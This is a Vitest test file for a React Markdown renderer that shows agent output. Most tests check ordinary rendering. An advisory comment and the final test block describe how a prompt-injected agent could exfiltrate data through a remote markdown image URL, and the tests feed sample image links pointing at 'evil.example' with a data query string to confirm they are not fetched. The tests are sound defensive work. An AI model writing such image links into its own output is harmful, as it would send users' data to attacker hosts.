import { describe, it, expect } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { Markdown, isSafeImageSrc } from '../src/renderer/lib/markdown'

// renderToStaticMarkup needs no DOM — react-markdown renders server-side fine.
const html = (text: string): string => renderToStaticMarkup(<Markdown text={text} />)

describe('Markdown', () => {
  it('renders GFM tables', () => {
    const out = html('| a | b |\n|---|---|\n| 1 | 2 |')
    expect(out).toContain('<table')
    expect(out).toContain('<td')
  })

  it('renders links, italics, and bold', () => {
    const out = html('see [x](https://example.com) and *em* and **bold**')
    expect(out).toContain('href="https://example.com"')
    expect(out).toContain('<em>')
    expect(out).toContain('<strong>')
  })

  it('renders ordered lists', () => {
    const out = html('1. one\n2. two')
    expect(out).toContain('<ol')
  })

  it('highlights fenced code blocks with hljs', () => {
    const out = html('```ts\nconst x = 1\n```')
    expect(out).toContain('md-pre')
    expect(out).toContain('hljs')
  })

  it('keeps inline code with the md-code class', () => {
    expect(html('use `npm test` here')).toContain('class="md-code"')
  })

  it('does not throw on malformed input', () => {
    expect(() => html('**unclosed [bracket')).not.toThrow()
  })
})

// Advisory: a remote image in agent markdown is fetched the moment it renders, so
// a prompt-injected agent could exfiltrate data in the URL (`![](https://evil/?q=…)`).
// Remote images render as inert text; same-origin and data: images still render.
describe('Markdown images are not fetched from other origins', () => {
  it('renders a remote image as plain text, with no <img>', () => {
    const out = renderToStaticMarkup(<Markdown text={'![secret](https://evil.example/x.png?d=abc)'} />)
    expect(out).not.toContain('<img')
    expect(out).toContain('[image: secret]')
    expect(out).toContain('https://evil.example/x.png?d=abc')
  })

  it('treats a protocol-relative URL as remote', () => {
    const out = renderToStaticMarkup(<Markdown text={'![x](//evil.example/x.png)'} />)
    expect(out).not.toContain('<img')
  })

  it('still renders a same-origin image (in the browser, where an origin is known)', () => {
    const g = globalThis as { location?: { origin: string } }
    const prev = g.location
    g.location = { origin: 'http://limn.localhost:5466' }
    try {
      const out = renderToStaticMarkup(<Markdown text={'![logo](/assets/logo.png)'} />)
      expect(out).toContain('<img')
      expect(out).toContain('src="/assets/logo.png"')
    } finally {
      g.location = prev
    }
  })

  it('isSafeImageSrc: same-origin yes, other origins and non-image data: no', () => {
    const origin = 'http://limn.localhost:5466'
    expect(isSafeImageSrc('/assets/logo.png', origin)).toBe(true)
    expect(isSafeImageSrc('http://limn.localhost:5466/a.png', origin)).toBe(true)
    expect(isSafeImageSrc('http://other.localhost:5466/a.png', origin)).toBe(false)
    expect(isSafeImageSrc('https://evil.example/a.png', origin)).toBe(false)
    expect(isSafeImageSrc('data:text/html,hi', origin)).toBe(false)
    expect(isSafeImageSrc('data:image/gif;base64,R0lGOD', undefined)).toBe(true)
    // no known origin (e.g. server-side render): only data: images are trusted
    expect(isSafeImageSrc('/assets/logo.png', undefined)).toBe(false)
    expect(isSafeImageSrc(undefined, origin)).toBe(false)
  })
})
